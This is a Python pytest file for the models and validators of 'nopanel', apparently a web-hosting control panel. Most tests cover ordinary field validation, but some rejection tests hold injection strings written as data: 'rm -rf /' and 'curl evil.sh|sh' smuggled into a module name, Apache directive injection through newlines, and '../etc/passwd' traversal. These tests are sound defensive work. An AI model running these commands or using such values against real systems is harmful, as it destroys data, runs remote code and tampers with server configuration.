"""Tests for nopanel.models — validation, serialization, immutability."""

import pytest
from pydantic import ValidationError

from nopanel.models import (
    Database,
    DatabasesConfig,
    Domain,
    DomainsConfig,
    FullConfig,
    LoginType,
    NetworkMode,
    NopanelConfig,
    Settings,
    SSLMode,
    User,
    UsersConfig,
    WebService,
    validate_db_name,
    validate_docroot,
    validate_domain,
    validate_email,
    validate_module_name,
    validate_password,
    validate_username,
)


class TestUsernameValidation:
    def test_valid_username(self):
        assert validate_username("alice")
        assert validate_username("bob_123")
        assert validate_username("_test")

    def test_invalid_username(self):
        assert not validate_username("Alice")  # uppercase
        assert not validate_username("1alice")  # starts with digit
        assert not validate_username("a" * 33)  # too long
        assert not validate_username("al ice")  # space
        assert not validate_username("")  # empty


class TestPasswordValidation:
    def test_valid_password(self):
        assert validate_password("password123")
        assert validate_password("a" * 8)

    def test_invalid_password(self):
        assert not validate_password("short")  # too short
        assert not validate_password("")  # empty
        assert not validate_password("a" * 129)  # too long


class TestDomainValidation:
    def test_valid_domain(self):
        assert validate_domain("example.com")
        assert validate_domain("sub.example.com")
        assert validate_domain("my-site.org")

    def test_invalid_domain(self):
        assert not validate_domain("example")  # no TLD
        assert not validate_domain("example.")  # trailing dot
        assert not validate_domain("")  # empty
        assert not validate_domain("a" * 64 + ".com")  # label too long


class TestDbNameValidation:
    def test_valid_db_name(self):
        assert validate_db_name("mydb")
        assert validate_db_name("my_db")
        assert validate_db_name("my-db")

    def test_invalid_db_name(self):
        assert not validate_db_name("1db")  # starts with digit
        assert not validate_db_name("db with space")


class TestUserModel:
    def test_create_user_defaults(self):
        user = User()
        assert user.fullname == ""
        assert user.email == ""
        assert user.login == LoginType.SFTP
        assert user.admin is False
        assert user.password == ""

    def test_create_user_with_values(self):
        user = User(fullname="Alice", email="alice@example.com", login=LoginType.SSH, admin=True)
        assert user.fullname == "Alice"
        assert user.login == LoginType.SSH
        assert user.admin is True


class TestEmailValidation:
    """Tests for email format validation (fix #20)."""

    def test_valid_emails(self):
        assert validate_email("alice@example.com")
        assert validate_email("bob.smith@test.org")
        assert validate_email("user+tag@domain.co.uk")

    def test_invalid_emails(self):
        assert not validate_email("not-an-email")
        assert not validate_email("missing@domain")
        assert not validate_email("@nodomain.com")
        assert not validate_email("")

    def test_empty_email_allowed(self):
        user = User(email="")
        assert user.email == ""

    def test_invalid_email_rejected(self):
        with pytest.raises(ValidationError):
            User(email="not-an-email")

    def test_valid_email_accepted(self):
        user = User(email="alice@example.com")
        assert user.email == "alice@example.com"

    def test_user_is_frozen(self):
        user = User(fullname="Alice")
        with pytest.raises(Exception):
            user.fullname = "Bob"  # type: ignore


class TestDomainModel:
    def test_create_domain_defaults(self):
        d = Domain(user="alice")
        assert d.user == "alice"
        assert d.php_version is None
        assert d.ssl == SSLMode.NONE
        assert d.aliases == []
        assert d.web is True
        assert d.docroot == "public_html"

    def test_create_domain_with_custom_docroot(self):
        d = Domain(user="alice", docroot="htdocs")
        assert d.docroot == "htdocs"

    def test_create_domain_with_php(self):
        d = Domain(user="alice", php_version="8.2", ssl=SSLMode.AUTO)
        assert d.php_version == "8.2"
        assert d.ssl == SSLMode.AUTO

    def test_domain_php_version_none_for_empty(self):
        d = Domain(user="alice", php_version="")
        assert d.php_version is None

    def test_domain_invalid_php_version(self):
        with pytest.raises(ValidationError):
            Domain(user="alice", php_version="abc")


class TestDatabaseModel:
    def test_create_database(self):
        db = Database(user="alice", dbuser="alice_blog", password="secret123")
        assert db.user == "alice"
        assert db.dbuser == "alice_blog"
        assert db.password == "secret123"


class TestUsersConfig:
    def test_valid_users(self):
        config = UsersConfig(users={"alice": User(fullname="Alice"), "bob": User()})
        assert "alice" in config.users
        assert config.users["alice"].fullname == "Alice"

    def test_invalid_username_rejected(self):
        with pytest.raises(ValidationError):
            UsersConfig(users={"Alice": User()})  # uppercase


class TestDomainsConfig:
    def test_valid_domains(self):
        config = DomainsConfig(domains={"example.com": Domain(user="alice")})
        assert "example.com" in config.domains

    def test_invalid_domain_rejected(self):
        with pytest.raises(ValidationError):
            DomainsConfig(domains={"not-a-domain": Domain(user="alice")})


class TestNopanelConfig:
    def test_defaults(self):
        config = NopanelConfig()
        assert config.version == 2
        assert config.settings.network_mode == NetworkMode.HOST
        assert config.settings.admin_email == ""

    def test_with_admin_email(self):
        config = NopanelConfig(settings=Settings(admin_email="admin@example.com"))
        assert config.settings.admin_email == "admin@example.com"


class TestWebServiceModules:
    """Tests for WebService.modules format (fix #10)."""

    def test_modules_no_mod_prefix(self):
        ws = WebService()
        for mod in ws.modules:
            assert not mod.startswith("mod_"), f"Module '{mod}' should not have mod_ prefix"

    def test_modules_contain_expected_names(self):
        ws = WebService()
        assert "md" in ws.modules
        assert "ssl" in ws.modules
        assert "proxy_fcgi" in ws.modules
        assert "rewrite" in ws.modules

    def test_ports_is_list_of_ints(self):
        """WebService.ports should be a list of ints, not a string (fix #8)."""
        ws = WebService()
        assert isinstance(ws.ports, list)
        assert all(isinstance(p, int) for p in ws.ports)
        assert 80 in ws.ports
        assert 443 in ws.ports


class TestFullConfig:
    def test_empty_config(self):
        config = FullConfig()
        assert config.nopanel.version == 2
        assert len(config.users.users) == 0
        assert len(config.domains.domains) == 0

    def test_serialization_roundtrip(self):
        config = FullConfig(
            nopanel=NopanelConfig(settings=Settings(admin_email="admin@test.com")),
            users=UsersConfig(users={"alice": User(fullname="Alice", email="alice@test.com")}),
            domains=DomainsConfig(domains={"test.com": Domain(user="alice", php_version="8.2")}),
            databases=DatabasesConfig(
                databases={"alice_blog": Database(user="alice", dbuser="alice_blog", password="pass12345")}
            ),
        )
        data = config.model_dump(mode="json")
        restored = FullConfig.model_validate(data)
        assert restored == config


class TestModuleNameValidation:
    """Tests for validate_module_name — prevent Dockerfile/shell injection."""

    def test_valid_module_name(self):
        assert validate_module_name("xdebug")
        assert validate_module_name("redis")
        assert validate_module_name("pecl:redis")
        assert validate_module_name("my-ext")
        assert validate_module_name("my_ext")

    def test_module_name_rejects_shell_metacharacters(self):
        assert not validate_module_name("xdebug && rm -rf /")
        assert not validate_module_name("xdebug;curl evil.sh|sh")
        assert not validate_module_name("xdebug$(whoami)")
        assert not validate_module_name("xdebug`id`")
        assert not validate_module_name("")
        assert not validate_module_name(" xdebug")
        assert not validate_module_name("xdebug\n")

    def test_module_name_rejects_path_traversal(self):
        assert not validate_module_name("../evil")
        assert not validate_module_name("foo/bar")


class TestDocrootValidation:
    """Tests for validate_docroot — prevent Apache config injection."""

    def test_valid_docroot(self):
        assert validate_docroot("public_html")
        assert validate_docroot("web/public")
        assert validate_docroot("app.dist")
        assert validate_docroot("a/b/c")

    def test_docroot_rejects_newlines(self):
        assert not validate_docroot("public_html\nServerAlias evil.com")
        assert not validate_docroot("public\rhtml")

    def test_docroot_rejects_path_traversal(self):
        assert not validate_docroot("../etc/passwd")
        assert not validate_docroot("foo/../../bar")

    def test_docroot_rejects_empty(self):
        assert not validate_docroot("")

    def test_docroot_rejects_shell_metacharacters(self):
        assert not validate_docroot("public;evil")
        assert not validate_docroot("public|evil")


class TestDomainAliasesValidation:
    """Tests for Domain.aliases validator — prevent Apache config injection."""

    def test_valid_aliases_accepted(self):
        d = Domain(user="alice", aliases=["www.example.com", "test.example.com"])
        assert d.aliases == ["www.example.com", "test.example.com"]

    def test_invalid_alias_rejected(self):
        with pytest.raises(ValidationError):
            Domain(user="alice", aliases=["not-a-domain"])

    def test_alias_with_newline_rejected(self):
        with pytest.raises(ValidationError):
            Domain(user="alice", aliases=["www.example.com\nServerAlias evil.com"])

    def test_empty_aliases_accepted(self):
        d = Domain(user="alice", aliases=[])
        assert d.aliases == []


class TestDomainDocrootValidator:
    """Tests for Domain.docroot validator."""

    def test_default_docroot_accepted(self):
        d = Domain(user="alice")
        assert d.docroot == "public_html"

    def test_valid_docroot_accepted(self):
        d = Domain(user="alice", docroot="web/public")
        assert d.docroot == "web/public"

    def test_docroot_with_newline_rejected(self):
        with pytest.raises(ValidationError):
            Domain(user="alice", docroot="public\nServerAlias evil.com")

    def test_docroot_with_traversal_rejected(self):
        with pytest.raises(ValidationError):
            Domain(user="alice", docroot="../etc/passwd")


class TestUserPasswordValidator:
    """Tests for User.password field validator (defense-in-depth)."""

    def test_valid_password_accepted(self):
        u = User(password="password123")
        assert u.password == "password123"

    def test_empty_password_accepted(self):
        u = User(password="")
        assert u.password == ""

    def test_short_password_rejected(self):
        with pytest.raises(ValidationError):
            User(password="short")

    def test_too_long_password_rejected(self):
        with pytest.raises(ValidationError):
            User(password="x" * 129)


class TestDatabasePasswordValidator:
    """Tests for Database.password field validator (defense-in-depth)."""

    def test_valid_password_accepted(self):
        db = Database(user="alice", dbuser="alice", password="password123")
        assert db.password == "password123"

    def test_empty_password_accepted(self):
        db = Database(user="alice", dbuser="alice", password="")
        assert db.password == ""

    def test_short_password_rejected(self):
        with pytest.raises(ValidationError):
            Database(user="alice", dbuser="alice", password="short")

    def test_too_long_password_rejected(self):
        with pytest.raises(ValidationError):
            Database(user="alice", dbuser="alice", password="x" * 129)
